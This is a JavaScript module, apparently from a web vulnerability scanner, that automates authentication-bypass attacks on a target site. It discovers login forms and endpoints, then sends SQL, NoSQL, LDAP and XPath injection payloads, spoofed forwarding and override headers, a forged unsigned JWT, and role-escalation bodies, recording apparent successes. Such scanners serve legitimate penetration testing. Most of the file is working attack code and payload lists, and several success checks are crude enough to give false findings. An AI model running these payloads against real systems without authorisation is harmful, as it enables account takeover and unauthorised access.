const axios = require('axios');
const { URL } = require('url');
const Logger = require('../utils/logger');
const crypto = require('crypto');
const cheerio = require('cheerio');

class AuthTester {
  constructor() {
    this.logger = new Logger();
    this.vulnerabilities = [];
    this.startTime = null;
    this.sessionTokens = new Map();
    this.discoveredEndpoints = new Set();
  }

  async test(options) {
    this.startTime = Date.now();
    const { url, credentials } = options;
    
    this.logger.scanBanner('AUTHENTICATION BYPASS', url);
    this.logger.logScanStart(url, 'Authentication Bypass Testing');

    try {
      // Phase 1: Authentication Mechanism Discovery
      this.logger.info('🔍 Phase 1: Authentication Mechanism Discovery');
      const authMechanisms = await this.discoverAuthMechanisms(url);
      
      // Phase 2: Parameter Pollution Testing
      this.logger.info('🔀 Phase 2: Parameter Pollution Testing');
      await this.testParameterPollution(url, authMechanisms);
      
      // Phase 3: Authentication Bypass Techniques
      this.logger.info('🚪 Phase 3: Authentication Bypass Techniques');
      await this.testAuthBypassTechniques(url, authMechanisms);
      
      // Phase 4: Session Management Testing
      this.logger.info('🎫 Phase 4: Session Management Testing');
      await this.testSessionManagement(url, authMechanisms);
      
      // Phase 5: JWT/Token Bypass Testing
      this.logger.info('🎟️ Phase 5: JWT/Token Bypass Testing');
      await this.testTokenBypass(url, authMechanisms);
      
      // Phase 6: Role-Based Access Control Testing
      this.logger.info('👥 Phase 6: RBAC Testing');
      await this.testRoleBasedAccess(url, authMechanisms);
      
      // Generate results
      const results = await this.generateResults(url, authMechanisms);
      
      this.logger.logScanComplete(url, 'Authentication Bypass Testing', results);
      this.logger.generateSummary(results);
      
      return results;
      
    } catch (error) {
      this.logger.error('Authentication testing failed', { error: error.message, stack: error.stack });
      throw error;
    }
  }

  async discoverAuthMechanisms(url) {
    this.logger.info('🔍 Discovering authentication mechanisms...');
    
    const mechanisms = {
      loginForms: [],
      apiEndpoints: [],
      authHeaders: [],
      cookies: [],
      tokens: [],
      methods: []
    };

    try {
      // Discover login forms
      const response = await axios.get(url, {
        timeout: 10000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      const $ = cheerio.load(response.data);
      
      // Find login forms
      $('form').each((_, form) => {
        const action = $(form).attr('action') || '';
        const method = $(form).attr('method') || 'GET';
        const inputs = [];
        
        $(form).find('input').each((_, input) => {
          const type = $(input).attr('type') || 'text';
          const name = $(input).attr('name') || '';
          const value = $(input).attr('value') || '';
          
          inputs.push({ type, name, value });
        });

        // Check if this looks like a login form
        const hasPasswordField = inputs.some(input => input.type === 'password');
        const hasUsernameField = inputs.some(input => 
          input.name.toLowerCase().includes('user') || 
          input.name.toLowerCase().includes('email') ||
          input.name.toLowerCase().includes('login')
        );

        if (hasPasswordField && hasUsernameField) {
          mechanisms.loginForms.push({
            action: action,
            method: method.toUpperCase(),
            inputs: inputs,
            url: new URL(action || '/login', url).href
          });
        }
      });

      // Discover common authentication endpoints
      const commonAuthPaths = [
        '/login',
        '/signin',
        '/auth',
        '/authenticate',
        '/api/auth',
        '/api/login',
        '/api/signin',
        '/oauth',
        '/sso',
        '/admin/login',
        '/user/login',
        '/account/login'
      ];

      for (const path of commonAuthPaths) {
        try {
          const testUrl = new URL(path, url).href;
          const testResponse = await axios.get(testUrl, {
            timeout: 5000,
            validateStatus: () => true
          });

          if (testResponse.status < 500) {
            mechanisms.apiEndpoints.push({
              url: testUrl,
              status: testResponse.status,
              contentType: testResponse.headers['content-type'] || '',
              requiresAuth: testResponse.status === 401 || testResponse.status === 403
            });
            this.discoveredEndpoints.add(testUrl);
          }

        } catch (error) {
          // Ignore network errors
        }
      }

      // Analyze authentication headers and cookies
      if (response.headers['set-cookie']) {
        response.headers['set-cookie'].forEach(cookie => {
          const cookieParts = cookie.split(';')[0].split('=');
          mechanisms.cookies.push({
            name: cookieParts[0],
            value: cookieParts[1] || '',
            secure: cookie.includes('Secure'),
            httpOnly: cookie.includes('HttpOnly'),
            sameSite: cookie.includes('SameSite')
          });
        });
      }

      // Check for common authentication headers
      const authHeaders = ['authorization', 'x-auth-token', 'x-api-key', 'x-access-token'];
      authHeaders.forEach(header => {
        if (response.headers[header]) {
          mechanisms.authHeaders.push({
            name: header,
            value: response.headers[header]
          });
        }
      });

      this.logger.info(`✅ Authentication discovery complete. Found ${mechanisms.loginForms.length} forms, ${mechanisms.apiEndpoints.length} endpoints`);

    } catch (error) {
      this.logger.warn(`Failed to discover authentication mechanisms: ${error.message}`);
    }

    return mechanisms;
  }

  async testParameterPollution(url, authMechanisms) {
    this.logger.info('🔀 Testing parameter pollution vulnerabilities...');

    // Test HTTP Parameter Pollution (HPP) on login forms
    for (let i = 0; i < authMechanisms.loginForms.length; i++) {
      const form = authMechanisms.loginForms[i];
      this.logger.progress(i + 1, authMechanisms.loginForms.length, 'Testing Form HPP');
      
      await this.testFormParameterPollution(form);
    }

    // Test JSON Parameter Pollution on API endpoints
    for (let i = 0; i < authMechanisms.apiEndpoints.length; i++) {
      const endpoint = authMechanisms.apiEndpoints[i];
      this.logger.progress(i + 1, authMechanisms.apiEndpoints.length, 'Testing API HPP');
      
      await this.testAPIParameterPollution(endpoint);
    }
  }

  async testFormParameterPollution(form) {
    const testCases = [
      // Classic HPP - duplicate parameters
      { username: 'user', username2: 'admin' },
      { user: 'user', user2: 'admin' },
      { email: 'user@test.com', email2: 'admin@test.com' },
      
      // Array notation pollution
      { 'user[]': 'user', 'user[]2': 'admin' },
      { 'username[]': 'user', 'username[]2': 'admin' },
      
      // Nested parameter pollution
      { 'user[name]': 'user', 'user[role]': 'admin' },
      { 'auth[user]': 'user', 'auth[admin]': 'true' },
      
      // URL encoding pollution
      { user: 'user&admin=true' },
      { username: 'user%26role%3Dadmin' }
    ];

    for (const testCase of testCases) {
      try {
        const formData = new URLSearchParams();
        
        // Add original form fields
        form.inputs.forEach(input => {
          if (input.type !== 'submit' && input.name) {
            formData.append(input.name, input.value || 'test');
          }
        });

        // Add pollution parameters
        Object.entries(testCase).forEach(([key, value]) => {
          formData.append(key, value);
        });

        const response = await axios.post(form.url, formData, {
          timeout: 5000,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          },
          validateStatus: () => true,
          maxRedirects: 0
        });

        // Check for successful bypass indicators
        const bypassIndicators = [
          response.status === 302, // Redirect (successful login)
          response.status === 200 && response.data.includes('dashboard'),
          response.status === 200 && response.data.includes('admin'),
          response.status === 200 && response.data.includes('welcome'),
          response.headers['set-cookie']?.some(cookie => 
            cookie.includes('session') || cookie.includes('token')
          )
        ];

        if (bypassIndicators.some(indicator => indicator)) {
          const vulnerability = {
            type: 'Authentication Bypass via Parameter Pollution',
            severity: 'Critical',
            url: form.url,
            parameter: 'Form Parameters',
            payload: JSON.stringify(testCase),
            evidence: 'Parameter pollution resulted in successful authentication',
            response: response.data.substring(0, 500),
            confidence: 'High',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logAuthBypass({
            url: form.url,
            method: 'POST',
            payload: JSON.stringify(testCase),
            success: true
          });
        }

      } catch (error) {
        this.logger.debug(`Form HPP test failed: ${error.message}`);
      }
    }
  }

  async testAPIParameterPollution(endpoint) {
    const jsonTestCases = [
      // JSON parameter pollution
      { "user": "user", "user": "admin" },
      { "username": "user", "role": "admin" },
      { "auth": { "user": "user", "admin": true } },
      
      // Nested JSON pollution
      { "user": { "name": "user", "role": "admin" } },
      { "credentials": { "username": "user", "isAdmin": true } },
      
      // Array-based pollution
      { "users": ["user", "admin"] },
      { "roles": ["user", "admin"] },
      
      // Mixed type pollution
      { "user": "user", "admin": 1 },
      { "auth": "user", "privileges": ["admin"] }
    ];

    for (const testCase of jsonTestCases) {
      try {
        const response = await axios.post(endpoint.url, testCase, {
          timeout: 5000,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
          },
          validateStatus: () => true
        });

        // Check for successful bypass
        const successIndicators = [
          response.status === 200 && response.data.token,
          response.status === 200 && response.data.success,
          response.status === 200 && response.data.admin,
          response.headers['authorization'],
          response.headers['x-auth-token']
        ];

        if (successIndicators.some(indicator => indicator)) {
          const vulnerability = {
            type: 'API Authentication Bypass via JSON Parameter Pollution',
            severity: 'Critical',
            url: endpoint.url,
            parameter: 'JSON Body',
            payload: JSON.stringify(testCase),
            evidence: 'JSON parameter pollution resulted in authentication bypass',
            response: JSON.stringify(response.data).substring(0, 500),
            confidence: 'High',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logAuthBypass({
            url: endpoint.url,
            method: 'POST',
            payload: JSON.stringify(testCase),
            success: true
          });
        }

      } catch (error) {
        this.logger.debug(`API HPP test failed: ${error.message}`);
      }
    }
  }

  async testAuthBypassTechniques(url, authMechanisms) {
    this.logger.info('🚪 Testing authentication bypass techniques...');

    const bypassTechniques = [
      this.testSQLAuthBypass.bind(this),
      this.testNoSQLAuthBypass.bind(this),
      this.testLDAPAuthBypass.bind(this),
      this.testXPathAuthBypass.bind(this),
      this.testHeaderInjectionBypass.bind(this),
      this.testMethodOverrideBypass.bind(this),
      this.testRaceConditionBypass.bind(this),
      this.testTimingAttackBypass.bind(this)
    ];

    for (let i = 0; i < bypassTechniques.length; i++) {
      const technique = bypassTechniques[i];
      this.logger.progress(i + 1, bypassTechniques.length, 'Testing Bypass Techniques');
      
      try {
        await technique(url, authMechanisms);
      } catch (error) {
        this.logger.debug(`Bypass technique failed: ${error.message}`);
      }
    }
  }

  async testSQLAuthBypass(url, authMechanisms) {
    const sqlPayloads = [
      { username: "admin'--", password: "anything" },
      { username: "admin'/*", password: "anything" },
      { username: "' OR '1'='1'--", password: "anything" },
      { username: "' OR 1=1#", password: "anything" },
      { username: "admin", password: "' OR '1'='1'--" },
      { username: "admin", password: "' OR 1=1#" },
      { username: "' UNION SELECT 'admin','password'--", password: "password" },
      { username: "admin'||'", password: "anything" }
    ];

    for (const form of authMechanisms.loginForms) {
      for (const payload of sqlPayloads) {
        try {
          const formData = new URLSearchParams();
          form.inputs.forEach(input => {
            if (input.type === 'password') {
              formData.append(input.name, payload.password);
            } else if (input.name.toLowerCase().includes('user') || input.name.toLowerCase().includes('email')) {
              formData.append(input.name, payload.username);
            } else if (input.type !== 'submit') {
              formData.append(input.name, input.value || '');
            }
          });

          const response = await axios.post(form.url, formData, {
            timeout: 5000,
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            validateStatus: () => true,
            maxRedirects: 0
          });

          if (this.isSuccessfulAuth(response)) {
            const vulnerability = {
              type: 'SQL Injection Authentication Bypass',
              severity: 'Critical',
              url: form.url,
              parameter: 'Login Form',
              payload: JSON.stringify(payload),
              evidence: 'SQL injection bypassed authentication',
              response: response.data.substring(0, 500),
              confidence: 'High',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: form.url,
              method: 'POST',
              payload: JSON.stringify(payload),
              success: true
            });
          }

        } catch (error) {
          // Continue with next payload
        }
      }
    }
  }

  async testNoSQLAuthBypass(url, authMechanisms) {
    const noSQLPayloads = [
      { username: { "$ne": null }, password: { "$ne": null } },
      { username: { "$regex": ".*" }, password: { "$regex": ".*" } },
      { username: { "$gt": "" }, password: { "$gt": "" } },
      { username: { "$in": ["admin", "administrator"] }, password: { "$ne": null } },
      { username: "admin", password: { "$ne": "wrongpassword" } },
      { "$or": [{ "username": "admin" }, { "email": "admin@test.com" }] },
      { username: { "$exists": true }, password: { "$exists": true } }
    ];

    for (const endpoint of authMechanisms.apiEndpoints) {
      if (endpoint.contentType.includes('json')) {
        for (const payload of noSQLPayloads) {
          try {
            const response = await axios.post(endpoint.url, payload, {
              timeout: 5000,
              headers: {
                'Content-Type': 'application/json'
              },
              validateStatus: () => true
            });

            if (this.isSuccessfulAuth(response)) {
              const vulnerability = {
                type: 'NoSQL Injection Authentication Bypass',
                severity: 'Critical',
                url: endpoint.url,
                parameter: 'JSON Body',
                payload: JSON.stringify(payload),
                evidence: 'NoSQL injection bypassed authentication',
                response: JSON.stringify(response.data).substring(0, 500),
                confidence: 'High',
                timestamp: new Date().toISOString()
              };

              this.vulnerabilities.push(vulnerability);
              this.logger.logAuthBypass({
                url: endpoint.url,
                method: 'POST',
                payload: JSON.stringify(payload),
                success: true
              });
            }

          } catch (error) {
            // Continue with next payload
          }
        }
      }
    }
  }

  async testLDAPAuthBypass(url, authMechanisms) {
    const ldapPayloads = [
      { username: "*", password: "*" },
      { username: "admin)(&)", password: "anything" },
      { username: "admin)(|(objectClass=*))", password: "anything" },
      { username: "*)(&", password: "anything" },
      { username: "*)(uid=*", password: "anything" }
    ];

    for (const form of authMechanisms.loginForms) {
      for (const payload of ldapPayloads) {
        try {
          const formData = new URLSearchParams();
          form.inputs.forEach(input => {
            if (input.type === 'password') {
              formData.append(input.name, payload.password);
            } else if (input.name.toLowerCase().includes('user')) {
              formData.append(input.name, payload.username);
            } else if (input.type !== 'submit') {
              formData.append(input.name, input.value || '');
            }
          });

          const response = await axios.post(form.url, formData, {
            timeout: 5000,
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            validateStatus: () => true,
            maxRedirects: 0
          });

          if (this.isSuccessfulAuth(response)) {
            const vulnerability = {
              type: 'LDAP Injection Authentication Bypass',
              severity: 'Critical',
              url: form.url,
              parameter: 'Login Form',
              payload: JSON.stringify(payload),
              evidence: 'LDAP injection bypassed authentication',
              response: response.data.substring(0, 500),
              confidence: 'Medium',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: form.url,
              method: 'POST',
              payload: JSON.stringify(payload),
              success: true
            });
          }

        } catch (error) {
          // Continue with next payload
        }
      }
    }
  }

  async testXPathAuthBypass(url, authMechanisms) {
    const xpathPayloads = [
      { username: "' or '1'='1", password: "' or '1'='1" },
      { username: "admin' or '1'='1'--", password: "anything" },
      { username: "x' or 1=1 or 'x'='y", password: "anything" }
    ];

    // Similar implementation to SQL bypass but for XPath
    for (const form of authMechanisms.loginForms) {
      for (const payload of xpathPayloads) {
        try {
          const formData = new URLSearchParams();
          form.inputs.forEach(input => {
            if (input.type === 'password') {
              formData.append(input.name, payload.password);
            } else if (input.name.toLowerCase().includes('user')) {
              formData.append(input.name, payload.username);
            } else if (input.type !== 'submit') {
              formData.append(input.name, input.value || '');
            }
          });

          const response = await axios.post(form.url, formData, {
            timeout: 5000,
            validateStatus: () => true,
            maxRedirects: 0
          });

          if (this.isSuccessfulAuth(response)) {
            const vulnerability = {
              type: 'XPath Injection Authentication Bypass',
              severity: 'High',
              url: form.url,
              parameter: 'Login Form',
              payload: JSON.stringify(payload),
              evidence: 'XPath injection bypassed authentication',
              confidence: 'Medium',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: form.url,
              method: 'POST',
              payload: JSON.stringify(payload),
              success: true
            });
          }

        } catch (error) {
          // Continue
        }
      }
    }
  }

  async testHeaderInjectionBypass(url, authMechanisms) {
    const headerBypassTests = [
      { 'X-Original-URL': '/admin' },
      { 'X-Rewrite-URL': '/admin' },
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Remote-IP': '127.0.0.1' },
      { 'X-Originating-IP': '127.0.0.1' },
      { 'X-Remote-Addr': '127.0.0.1' },
      { 'X-Client-IP': '127.0.0.1' },
      { 'Authorization': 'Bearer admin' },
      { 'X-Auth-Token': 'admin' },
      { 'X-API-Key': 'admin' }
    ];

    for (const endpoint of this.discoveredEndpoints) {
      for (const headers of headerBypassTests) {
        try {
          const response = await axios.get(endpoint, {
            timeout: 5000,
            headers: {
              ...headers,
              'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
            },
            validateStatus: () => true
          });

          // Check if bypass was successful
          if (response.status === 200 && 
              (response.data.includes('admin') || 
               response.data.includes('dashboard') ||
               response.data.includes('unauthorized') === false)) {
            
            const vulnerability = {
              type: 'Authentication Bypass via Header Injection',
              severity: 'High',
              url: endpoint,
              parameter: 'HTTP Headers',
              payload: JSON.stringify(headers),
              evidence: 'Header injection bypassed authentication',
              response: response.data.substring(0, 500),
              confidence: 'Medium',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: endpoint,
              method: 'GET',
              payload: JSON.stringify(headers),
              success: true
            });
          }

        } catch (error) {
          // Continue
        }
      }
    }
  }

  async testMethodOverrideBypass(url, authMechanisms) {
    const methodOverrides = [
      { 'X-HTTP-Method-Override': 'GET' },
      { 'X-HTTP-Method': 'GET' },
      { 'X-Method-Override': 'GET' },
      { '_method': 'GET' }
    ];

    for (const endpoint of this.discoveredEndpoints) {
      for (const override of methodOverrides) {
        try {
          const response = await axios.post(endpoint, {}, {
            timeout: 5000,
            headers: {
              ...override,
              'Content-Type': 'application/json'
            },
            validateStatus: () => true
          });

          if (response.status === 200) {
            const vulnerability = {
              type: 'Authentication Bypass via Method Override',
              severity: 'Medium',
              url: endpoint,
              parameter: 'HTTP Method Override',
              payload: JSON.stringify(override),
              evidence: 'Method override bypassed authentication',
              confidence: 'Low',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: endpoint,
              method: 'POST',
              payload: JSON.stringify(override),
              success: true
            });
          }

        } catch (error) {
          // Continue
        }
      }
    }
  }

  async testRaceConditionBypass(url, authMechanisms) {
    // Test for race conditions in authentication
    for (const form of authMechanisms.loginForms) {
      try {
        const formData = new URLSearchParams();
        form.inputs.forEach(input => {
          if (input.type !== 'submit') {
            formData.append(input.name, 'test');
          }
        });

        // Make multiple concurrent requests
        const requests = Array(10).fill().map(() => 
          axios.post(form.url, formData, {
            timeout: 5000,
            validateStatus: () => true,
            maxRedirects: 0
          })
        );

        const responses = await Promise.allSettled(requests);
        
        // Check if any succeeded
        const successfulResponses = responses.filter(result => 
          result.status === 'fulfilled' && this.isSuccessfulAuth(result.value)
        );

        if (successfulResponses.length > 0) {
          const vulnerability = {
            type: 'Authentication Bypass via Race Condition',
            severity: 'Medium',
            url: form.url,
            parameter: 'Concurrent Requests',
            payload: 'Multiple concurrent login attempts',
            evidence: `${successfulResponses.length} out of ${requests.length} requests succeeded`,
            confidence: 'Low',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logAuthBypass({
            url: form.url,
            method: 'POST',
            payload: 'Race condition',
            success: true
          });
        }

      } catch (error) {
        // Continue
      }
    }
  }

  async testTimingAttackBypass(url, authMechanisms) {
    // Test for timing-based authentication bypass
    for (const form of authMechanisms.loginForms) {
      const timings = [];
      
      const testUsers = ['admin', 'administrator', 'user', 'test', 'nonexistent'];
      
      for (const username of testUsers) {
        try {
          const formData = new URLSearchParams();
          form.inputs.forEach(input => {
            if (input.type === 'password') {
              formData.append(input.name, 'wrongpassword');
            } else if (input.name.toLowerCase().includes('user')) {
              formData.append(input.name, username);
            } else if (input.type !== 'submit') {
              formData.append(input.name, input.value || '');
            }
          });

          const startTime = Date.now();
          const response = await axios.post(form.url, formData, {
            timeout: 10000,
            validateStatus: () => true
          });
          const endTime = Date.now();

          timings.push({
            username: username,
            time: endTime - startTime,
            status: response.status
          });

        } catch (error) {
          // Continue
        }
      }

      // Analyze timing differences
      if (timings.length > 1) {
        const avgTime = timings.reduce((sum, t) => sum + t.time, 0) / timings.length;
        const significantDifferences = timings.filter(t => Math.abs(t.time - avgTime) > 500);

        if (significantDifferences.length > 0) {
          const vulnerability = {
            type: 'Username Enumeration via Timing Attack',
            severity: 'Low',
            url: form.url,
            parameter: 'Response Timing',
            payload: JSON.stringify(significantDifferences),
            evidence: 'Timing differences indicate valid usernames',
            confidence: 'Low',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }
      }
    }
  }

  async testSessionManagement(url, authMechanisms) {
    this.logger.info('🎫 Testing session management...');

    // Test session fixation, session hijacking, etc.
    await this.testSessionFixation(url, authMechanisms);
    await this.testSessionPrediction(url, authMechanisms);
    await this.testCookieSecurityFlags(url, authMechanisms);
  }

  async testSessionFixation(url, authMechanisms) {
    for (const form of authMechanisms.loginForms) {
      try {
        // Set a session cookie before login
        const fixedSessionId = 'FIXED_SESSION_' + crypto.randomBytes(16).toString('hex');
        
        const formData = new URLSearchParams();
        form.inputs.forEach(input => {
          if (input.type !== 'submit') {
            formData.append(input.name, 'test');
          }
        });

        const response = await axios.post(form.url, formData, {
          timeout: 5000,
          headers: {
            'Cookie': `PHPSESSID=${fixedSessionId}; JSESSIONID=${fixedSessionId}`
          },
          validateStatus: () => true,
          maxRedirects: 0
        });

        // Check if the fixed session ID is still present after login
        const setCookieHeaders = response.headers['set-cookie'] || [];
        const sessionFixed = setCookieHeaders.some(cookie => 
          cookie.includes(fixedSessionId)
        );

        if (sessionFixed) {
          const vulnerability = {
            type: 'Session Fixation',
            severity: 'Medium',
            url: form.url,
            parameter: 'Session Cookie',
            payload: `Fixed session: ${fixedSessionId}`,
            evidence: 'Session ID was not regenerated after login',
            confidence: 'Medium',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }

      } catch (error) {
        // Continue
      }
    }
  }

  async testSessionPrediction(url, authMechanisms) {
    const sessionIds = [];
    
    // Collect multiple session IDs
    for (let i = 0; i < 5; i++) {
      try {
        const response = await axios.get(url, {
          timeout: 5000
        });

        const setCookieHeaders = response.headers['set-cookie'] || [];
        setCookieHeaders.forEach(cookie => {
          const sessionMatch = cookie.match(/(PHPSESSID|JSESSIONID|session_id|sessionid)=([^;]+)/i);
          if (sessionMatch) {
            sessionIds.push(sessionMatch[2]);
          }
        });

      } catch (error) {
        // Continue
      }
    }

    // Analyze session ID entropy
    if (sessionIds.length > 2) {
      const uniqueIds = new Set(sessionIds);
      if (uniqueIds.size < sessionIds.length * 0.8) {
        const vulnerability = {
          type: 'Weak Session ID Generation',
          severity: 'Medium',
          url: url,
          parameter: 'Session IDs',
          payload: sessionIds.join(', '),
          evidence: 'Session IDs show low entropy or predictable patterns',
          confidence: 'Low',
          timestamp: new Date().toISOString()
        };

        this.vulnerabilities.push(vulnerability);
        this.logger.logVulnerability(vulnerability);
      }
    }
  }

  async testCookieSecurityFlags(url, authMechanisms) {
    try {
      const response = await axios.get(url, {
        timeout: 5000
      });

      const setCookieHeaders = response.headers['set-cookie'] || [];
      
      setCookieHeaders.forEach(cookie => {
        const isSecure = cookie.includes('Secure');
        const isHttpOnly = cookie.includes('HttpOnly');
        const hasSameSite = cookie.includes('SameSite');
        
        if (!isSecure || !isHttpOnly || !hasSameSite) {
          const vulnerability = {
            type: 'Insecure Cookie Configuration',
            severity: 'Low',
            url: url,
            parameter: 'Cookie Flags',
            payload: cookie,
            evidence: `Missing security flags: ${[
              !isSecure ? 'Secure' : '',
              !isHttpOnly ? 'HttpOnly' : '',
              !hasSameSite ? 'SameSite' : ''
            ].filter(Boolean).join(', ')}`,
            confidence: 'High',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }
      });

    } catch (error) {
      // Continue
    }
  }

  async testTokenBypass(url, authMechanisms) {
    this.logger.info('🎟️ Testing JWT/Token bypass...');

    // Test JWT vulnerabilities
    await this.testJWTBypass(url, authMechanisms);
    await this.testTokenManipulation(url, authMechanisms);
  }

  async testJWTBypass(url, authMechanisms) {
    const jwtBypassTechniques = [
      // None algorithm
      { alg: 'none' },
      // Weak secret
      { secret: 'secret' },
      { secret: 'password' },
      { secret: '123456' },
      // Algorithm confusion
      { alg: 'HS256', forceRSA: true }
    ];

    // This is a simplified JWT bypass test
    // In a real implementation, you'd need a proper JWT library
    for (const endpoint of authMechanisms.apiEndpoints) {
      for (const technique of jwtBypassTechniques) {
        try {
          let fakeToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.';
          
          const response = await axios.get(endpoint.url, {
            timeout: 5000,
            headers: {
              'Authorization': `Bearer ${fakeToken}`
            },
            validateStatus: () => true
          });

          if (response.status === 200) {
            const vulnerability = {
              type: 'JWT Authentication Bypass',
              severity: 'Critical',
              url: endpoint.url,
              parameter: 'Authorization Header',
              payload: `Fake JWT: ${fakeToken}`,
              evidence: 'JWT bypass successful with manipulated token',
              confidence: 'Medium',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: endpoint.url,
              method: 'GET',
              payload: `JWT: ${technique.alg || 'manipulation'}`,
              success: true
            });
          }

        } catch (error) {
          // Continue
        }
      }
    }
  }

  async testTokenManipulation(url, authMechanisms) {
    const tokenManipulations = [
      '',
      'null',
      'undefined',
      'admin',
      '{"user":"admin","role":"admin"}',
      btoa('{"user":"admin","role":"admin"}')
    ];

    for (const endpoint of authMechanisms.apiEndpoints) {
      for (const token of tokenManipulations) {
        try {
          const response = await axios.get(endpoint.url, {
            timeout: 5000,
            headers: {
              'X-Auth-Token': token,
              'Authorization': `Bearer ${token}`
            },
            validateStatus: () => true
          });

          if (response.status === 200) {
            const vulnerability = {
              type: 'Token Manipulation Authentication Bypass',
              severity: 'High',
              url: endpoint.url,
              parameter: 'Authentication Token',
              payload: token,
              evidence: 'Token manipulation bypassed authentication',
              confidence: 'Medium',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logAuthBypass({
              url: endpoint.url,
              method: 'GET',
              payload: `Token: ${token}`,
              success: true
            });
          }

        } catch (error) {
          // Continue
        }
      }
    }
  }

  async testRoleBasedAccess(url, authMechanisms) {
    this.logger.info('👥 Testing role-based access control...');

    // Test privilege escalation
    await this.testPrivilegeEscalation(url, authMechanisms);
    await this.testRoleManipulation(url, authMechanisms);
  }

  async testPrivilegeEscalation(url, authMechanisms) {
    const adminPaths = [
      '/admin',
      '/administrator',
      '/admin.php',
      '/admin/users',
      '/admin/settings',
      '/api/admin',
      '/api/users',
      '/management'
    ];

    for (const path of adminPaths) {
      try {
        const testUrl = new URL(path, url).href;
        
        const response = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true
        });

        // Check if admin area is accessible without authentication
        if (response.status === 200 && 
            (response.data.includes('admin') || 
             response.data.includes('users') ||
             response.data.includes('settings'))) {
          
          const vulnerability = {
            type: 'Privilege Escalation - Unprotected Admin Area',
            severity: 'Critical',
            url: testUrl,
            parameter: 'URL Path',
            payload: path,
            evidence: 'Admin area accessible without authentication',
            response: response.data.substring(0, 500),
            confidence: 'High',
            timestamp: new Date().toISOString()
          };

          this.vulnerabilities.push(vulnerability);
          this.logger.logVulnerability(vulnerability);
        }

      } catch (error) {
        // Continue
      }
    }
  }

  async testRoleManipulation(url, authMechanisms) {
    const roleManipulations = [
      { role: 'admin' },
      { isAdmin: true },
      { privileges: ['admin'] },
      { user_type: 'admin' },
      { level: 'admin' },
      { group: 'administrators' }
    ];

    for (const endpoint of authMechanisms.apiEndpoints) {
      for (const roleData of roleManipulations) {
        try {
          const response = await axios.post(endpoint.url, roleData, {
            timeout: 5000,
            headers: {
              'Content-Type': 'application/json'
            },
            validateStatus: () => true
          });

          if (response.status === 200 && response.data.admin) {
            const vulnerability = {
              type: 'Role Manipulation Privilege Escalation',
              severity: 'High',
              url: endpoint.url,
              parameter: 'Role Data',
              payload: JSON.stringify(roleData),
              evidence: 'Role manipulation resulted in privilege escalation',
              confidence: 'Medium',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.logger.logVulnerability(vulnerability);
          }

        } catch (error) {
          // Continue
        }
      }
    }
  }

  isSuccessfulAuth(response) {
    const successIndicators = [
      response.status === 302, // Redirect
      response.status === 200 && response.data.includes('dashboard'),
      response.status === 200 && response.data.includes('welcome'),
      response.status === 200 && response.data.includes('admin'),
      response.status === 200 && response.data.success,
      response.status === 200 && response.data.token,
      response.headers['set-cookie']?.some(cookie => 
        cookie.includes('session') || cookie.includes('token') || cookie.includes('auth')
      ),
      response.headers['authorization'],
      response.headers['x-auth-token']
    ];

    return successIndicators.some(indicator => indicator);
  }

  async generateResults(target, authMechanisms) {
    const duration = Date.now() - this.startTime;
    const results = {
      target,
      timestamp: new Date().toISOString(),
      duration: `${Math.round(duration / 1000)}s`,
      authMechanisms: authMechanisms,
      vulnerabilities: this.vulnerabilities,
      total: this.vulnerabilities.length,
      critical: this.vulnerabilities.filter(v => v.severity === 'Critical').length,
      high: this.vulnerabilities.filter(v => v.severity === 'High').length,
      medium: this.vulnerabilities.filter(v => v.severity === 'Medium').length,
      low: this.vulnerabilities.filter(v => v.severity === 'Low').length,
      info: this.vulnerabilities.filter(v => v.severity === 'Info').length
    };

    return results;
  }
}

module.exports = AuthTester;